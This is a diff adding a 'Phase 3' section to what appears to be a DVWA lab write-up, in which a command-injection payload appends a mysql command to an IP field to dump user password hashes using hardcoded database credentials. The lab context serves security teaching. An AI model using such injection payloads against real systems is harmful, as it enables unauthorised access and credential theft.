@@ -43,6 +43,16 @@ specific credential lines.
 
 The result is that the server returns the plaintext credentials. 
 
+### Phase 3: The Heist 
+
+Weneed to run a command that logs into the database locally (where it trusts the connection) and dumps the password hashes to the screen.
+
+*The Payload: 127.0.0.1; mysql -h 127.0.0.1 -u app -pvulnerables -D dvwa -e "SELECT user, password FROM users;"*
+
+### <img width="654" height="312" alt="image" src="https://github.com/user-attachments/assets/0d131a01-10b0-4ff5-9164-2cd7e5c44354" />
+
+
+
 
 
 
